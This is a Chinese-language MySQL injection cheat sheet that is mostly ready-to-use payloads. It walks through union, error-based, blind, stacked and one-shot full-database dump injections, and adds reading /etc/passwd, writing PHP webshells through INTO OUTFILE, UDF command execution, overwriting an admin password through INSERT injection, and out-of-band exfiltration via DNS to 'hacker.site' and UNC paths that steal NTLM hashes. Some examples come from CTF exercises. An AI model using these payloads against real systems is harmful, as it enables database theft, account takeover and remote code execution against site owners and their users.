# MySQL Injection

## 摘要

- [MySQL 默认数据库](#mysql-默认数据库)
- [MySQL 注释](#mysql-注释)
- [构造闭合](#构造闭合)
- [类型判断](#类型判断)
- [Union 联合注入](#union-联合注入)
  - [测试字段数](#测试字段数)
  - [查找显示位](#查找显示位)
  - [获取库名](#获取库名)
  - [获取表名](#获取表名)
  - [获取列名](#获取列名)
    - [不使用 Information\_Schema 提取列名](#不使用-information_schema-提取列名)
  - [数据提取](#数据提取)
    - [不使用列名提取数据](#不使用列名提取数据)
- [报错注入](#报错注入)
  - [MYSQL Error Based - Basic](#mysql-error-based---basic)
  - [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)
  - [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)
  - [MYSQL Error Based - NAME\_CONST function (only for constants)](#mysql-error-based---name_const-function-only-for-constants)
- [布尔盲注](#布尔盲注)
  - [MySQL 盲注中的子串截取等价函数](#mysql-盲注中的子串截取等价函数)
  - [利用条件语句进行盲注](#利用条件语句进行盲注)
  - [MYSQL Blind With MAKE\_SET](#mysql-blind-with-make_set)
  - [MYSQL Blind With LIKE](#mysql-blind-with-like)
  - [MySQL Blind with REGEXP](#mysql-blind-with-regexp)
  - [利用脚本样例](#利用脚本样例)
- [时间盲注](#时间盲注)
  - [在子查询中使用 SLEEP](#在子查询中使用-sleep)
  - [使用条件语句](#使用条件语句)
  - [利用脚本样例](#利用脚本样例-1)
- [堆叠注入](#堆叠注入)
- [MySQL DIOS - 一次性脱库](#mysql-dios---一次性脱库)
- [MySQL 当前查询](#mysql-当前查询)
- [MySQL 读取文件内容](#mysql-读取文件内容)
- [MySQL 命令执行](#mysql-命令执行)
  - [WEBSHELL - OUTFILE 方法](#webshell---outfile-方法)
  - [WEBSHELL - DUMPFILE 方法](#webshell---dumpfile-方法)
  - [COMMAND - UDF 库](#command---udf-库)
- [MySQL INSERT 注入](#mysql-insert-注入)
- [MySQL 截断注入](#mysql-截断注入)
- [MySQL 带外注入](#mysql-带外注入)
  - [DNS 数据外带](#dns-数据外带)
  - [UNC 路径 - NTLM 哈希窃取](#unc-路径---ntlm-哈希窃取)

## MySQL 默认数据库

| 名称                 | 描述             |
| ------------------ | -------------- |
| mysql              | 需要 root 权限     |
| information_schema | 在版本 5 及更高版本中可用 |

## MySQL 注释

MySQL 注释是 SQL 代码中的注解，在执行期间会被 MySQL 服务器忽略。

| Type                       | Description                       |
| -------------------------- | --------------------------------- |
| `#`                        | Hash comment                      |
| `/* MYSQL Comment */`      | C-style comment                   |
| `/*! MYSQL Special SQL */` | Special SQL                       |
| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
| `--`                       | SQL comment                       |
| `;%00`                     | Nullbyte                          |
| \`                         | Backtick                          |

## 构造闭合

SQL 注入最重要、最根本的一点是构造闭合，我们就是通过不破坏现有 SQL 语句，构造闭合去增加或者创造新的 SQL 语句来实现 SQL 注入的。

例如，原始查询语句如下：

```sql
select * from table where id = '?'
select * from table where id = ('?')
```

我们构造闭合之后如下（`<...>` 内的内容就是我们构造的内容）：

```sql
select * from table where id = '<1' and '1'='1>'
select * from table where id = ('<1') and ('1'='1>')
```

实际我们注入后如下：

```sql
select * from table where id = '1' and '1'='1'
select * from table where id = ('1') and ('1'='1')
```

## 类型判断

判断是字符型还是数字型，简单来说就是数字型不需要符号包裹，而字符型需要。

- 数字型：`select * from table where id =$id`
- 字符型：`select * from table where id='$id'`

判断数字型：

```sql
1 and 1=1
1 and 1=2
```

判断字符型：

```sql
1' and '1'='1
1' and '1'='2
```

若永假式运行错误，则说明此 SQL 注入为数字型注入。

## Union 联合注入

该注入方式适用于页面有回显数据。

### 测试字段数

通过 `order by` 来判断字段个数，超出字段数会报错，注意 `#` 要进行编码。

```sql
1' order by 3# 
1' order by 4#
```

### 查找显示位

观察返回的结果显示哪个数字。

```sql
1' union select 1,2,3#
```

### 获取库名

```sql
1' union select 1,2,database()#
```

### 获取表名

```sql
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

### 获取列名

```sql
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
```

#### 不使用 Information_Schema 提取列名

适用于 `MySQL >= 4.1` 的方法：

| Payload                                                                   | Output                                  |
| ------------------------------------------------------------------------- | --------------------------------------- |
| `(1)and(SELECT * from db.users)=(1)`                                      | Operand should contain **4** column (s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null          |

适用于 `MySQL 5` 的方法：

| Payload                                                                  | Output                           |
| ------------------------------------------------------------------------ | -------------------------------- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                | Duplicate column name '**id**'   |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`      | Duplicate column name '**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data                             |

### 数据提取

```sql
1' union select 1,2,username from users#
1' union select 1,2,password from users where username='admin'#
```

#### 不使用列名提取数据

在不知道列名的情况下，从第 4 列提取数据。

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

在查询 `select author_id,title from posts where author_id=[INJECT_HERE]` 中的注入示例：

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## 报错注入

- 使用 `UPDATEXML` 或者 `EXTRACTVALUE` 时，当数据超过 32 位时，需配合 `mid()` / `substr()` 截取。
-  `GTID_SUBSET()` / `GTID_SUBTRACT()` 要求 `MySQL >= 5.6` 版本。
- `JSON_KEYS` 要求 `MySQL >= 5.7.8` 版本。
- `UUID_TO_BIN` 要求 `MySQL >= 8.0` 版本。

| Name         | Payload                                                                                          |
| ------------ | ------------------------------------------------------------------------------------------------ |
| UPDATEXML    | `0' AND (SELECT UPDATEXML(12,CONCAT('.','~',(SELECT version()),'~'),34) -- `                     |
| EXTRACTVALUE | `0' AND (SELECT EXTRACTVALUE(12,CONCAT('.','~',(SELECT version()),'~')) -- `                     |
| OR           | `0' OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- `         |
| EXP          | `0' AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- `              |
| GTID_SUBSET  | `0' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- `                                |
| JSON_KEYS    | `0' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- ` |
| UUID_TO_BIN  | `0' AND UUID_TO_BIN(version())='1`                                                               |

### MYSQL Error Based - Basic

Works with `MySQL >= 4.1`。

```sql
0' union select 1,count(*),concat((select database()),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+
0' union select 1,count(*),concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+
0' union select 1,count(*),concat((select concat(column_name) from information_schema.columns where table_name='flag' limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+
0' union select 1,count(*),concat((select flag from flag),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+
```

### MYSQL Error Based - UpdateXML Function

```sql
0' and (select updatexml(1,(concat(0x7e,(select database()),0x7e)),1));#
0' and (select updatexml(1,(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)),1));#
0' and (select updatexml(1,(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag'),0x7e)),1));#
0' and (select updatexml(1,(concat(0x7e,substr((select flag from ctfshow_flag),31,50),0x7e)),1));#
```

Shorter to read:

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- 
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- 
```

### MYSQL Error Based - Extractvalue Function

Works with `MySQL >= 5.1`

```sql
0' and (select extractvalue(1,concat(0x7e,(select database()),0x7e)));#
0' and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)));#
0' and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e)));#
0' and (select extractvalue(1,concat(0x7e,substr((select flag from flag),31,50),0x7e)));#
```

### MYSQL Error Based - NAME_CONST function (only for constants)

Works with `MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## 布尔盲注

### MySQL 盲注中的子串截取等价函数

| Function    | Example                        | Description         |
| ----------- | ------------------------------ | ------------------- |
| `SUBSTR`    | `SUBSTR(version(),1,1)=5`      | 从字符串中提取子串（可从任意位置开始） |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`   | 从字符串中提取子串（可从任意位置开始） |
| `RIGHT`     | `RIGHT(left(version(),1),1)=5` | 从字符串右侧开始提取指定数量的字符   |
| `MID`       | `MID(version(),1,1)=4`         | 从字符串中提取子串（可从任意位置开始） |
| `LEFT`      | `LEFT(version(),1)=4`          | 从字符串左侧开始提取指定数量的字符   |

使用 `SUBSTRING` 或其他等价函数进行盲注的示例：

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### 利用条件语句进行盲注

* TRUE: `if @@version starts with a 5`:

  ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
	```

* FALSE: `if @@version starts with a 4`:

  ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
  ```

### MYSQL Blind With MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

### MYSQL Blind With LIKE

在 MySQL 中，`LIKE` 运算符可用于在查询中执行模式匹配。该运算符允许使用通配符来匹配未知或部分字符串值。这在盲注场景中特别有用。

  LIKE 中的通配符：

  - 百分号 (`%`)：代表零个、一个或多个字符。可用于匹配任意字符序列。
  - 下划线 (`_`)：代表单个字符。当你知道数据的结构但不确定某个位置的具体字符时，用于更精确的匹配

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### MySQL Blind with REGEXP

盲注还可以使用 MySQL 的 `REGEXP` 运算符来实现，该运算符用于将字符串与正则表达式进行匹配。当攻击者需要比 `LIKE` 运算符更复杂的模式匹配时，这种技术特别有用。

| Payload                                                                | Description |
| ---------------------------------------------------------------------- | ----------- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | 检查长度        |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | 检查是否包含数字    |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | 检查数据是否以 "a" |

### 利用脚本样例

- 请参考相关[脚本](scripts/error-base-1.py)，进行利用脚本编写。

## 时间盲注

以下 SQL 代码可以使 MySQL 的输出产生延迟。

- MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)

```sql
+BENCHMARK(40000000,SHA1(1337))+
'+BENCHMARK(3200,SHA1(1))+'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

- MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)

```sql
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
AND SLEEP(10)=0
AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
```

### 在子查询中使用 SLEEP

提取数据长度。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

提取第二个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

提取第三个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

提取列名（column_name）。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

### 使用条件语句

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

### 利用脚本样例

- 请参考相关[脚本](scripts/time-blind-1.py)，进行利用脚本编写。

## 堆叠注入

堆叠注入（Stacked Queries Injection）是指通过分号 ; 将多条 SQL 语句拼接在一起执行的注入方式。与 UNION 注入只能执行 SELECT 查询不同，堆叠注入可以执行任意 SQL 语句，包括 INSERT、UPDATE、DELETE、CREATE、DROP 等，危害更大。

堆叠注入并非在所有环境下都可用，需要满足以下条件：

- 数据库支持多语句执行：MySQL、SQL Server、PostgreSQL 支持；Oracle 不支持。
- 应用层 API 支持：PHP 中需要使用 `mysqli_multi_query()` 函数；常规的 mysqli_query() 不支持多语句执行。
 - PDO 场景：MySQL 默认可利用；PostgreSQL 默认不可利用，除非开启了 `PDO::ATTR_EMULATE_PREPARES => true`。

```sql
';select database();#
';select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1;#
```

## MySQL DIOS - 一次性脱库

DIOS (Dump In One Shot，一次性脱库) SQL 注入是一种高级技术，允许攻击者通过单个精心构造的 SQL 注入 payload 提取整个数据库内容。该方法利用了将多条数据拼接成单个结果集的能力，然后将其在数据库的一次响应中返回。

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

* SecurityIdiots

```sql
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

* Profexer

```sql
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
```

* Dr.Z3r0

```sql
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
```

* M@dBl00d

```sql
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
```

* Zen

```sql
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

- sharik

```sql
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

## MySQL 当前查询

`INFORMATION_SCHEMA.PROCESSLIST` 是 MySQL 和 MariaDB 中可用的一张特殊表，它提供有关数据库服务器内活动进程和线程的信息。此表可以列出当前 DB 正在执行的所有操作。

`PROCESSLIST` 表包含几个重要的列，每列提供有关当前进程的详细信息。常见的列包括：

* **ID**：进程标识符。
* **USER**：运行该进程的 MySQL 用户。
* **HOST**：发起进程的主机。
* **DB**：进程当前正在访问的数据库（如果有）。
* **COMMAND**：进程正在执行的命令类型（例如，Query，Sleep）。
* **TIME**：进程已经运行的时间（秒）。
* **STATE**：进程的当前状态。
* **INFO**：正在执行的语句文本，如果未执行任何语句，则为 NULL。

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |
| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |
| 3   | gues_user | example. Com: 3360 | NULL    | Connect | 0    | connecting | NULL |

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

使用一次性脱库 (DIOS) 查询提取该表的全部内容。

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## MySQL 读取文件内容

需要 `filepriv` 权限，否则您将收到错误：`ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

如果您是数据库的 `root` 用户，可以使用以下查询重新启用 `LOAD_FILE`：

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MySQL 命令执行

### WEBSHELL - OUTFILE 方法

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL - DUMPFILE 方法

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### COMMAND - UDF 库

首先，您需要检查服务器上是否安装了 UDF。

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

然后您可以使用 `sys_exec` 和 `sys_eval` 等函数。

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## MySQL INSERT 注入

`ON DUPLICATE KEY UPDATE` 关键字用于告诉 MySQL，当应用程序尝试向表中插入已存在的行时该怎么做。我们可以利用这一点来更改管理员密码：

使用 payload 注入：

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

查询将如下所示：

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

此查询将为用户 “`attacker_dummy@example.com`” 插入一行。它还将为用户 “`admin@example.com`” 插入一行。

由于该行已经存在，`ON DUPLICATE KEY UPDATE` 关键字告诉 MySQL 将已存在行的 `password` 列更新为 “ P@ssw0rd ”。之后，我们只需使用 “`admin@example.com`” 和密码 “ P@ssw0rd ” 进行身份验证即可。

## MySQL 截断注入

在 MYSQL 中，“`admin`” 和 “`admin      `” 是相同的。如果数据库中的用户名列有字符数限制，则多余的字符将被截断。因此，如果数据库的列限制为 20 个字符，而我们输入了一个包含 21 个字符的字符串，那么最后 1 个字符将被删除。

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"`

## MySQL 带外注入

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### DNS 数据外带

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC 路径 - NTLM 哈希窃取

术语 “UNC 路径” 是指通用命名约定 (Universal Naming Convention) 路径，用于指定网络上共享文件或设备等资源的位置。它通常在 Windows 环境中用于通过诸如 `\\server\share\file` 格式的网络访问文件。

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

> 别忘了对 '\\\\' 进行转义。
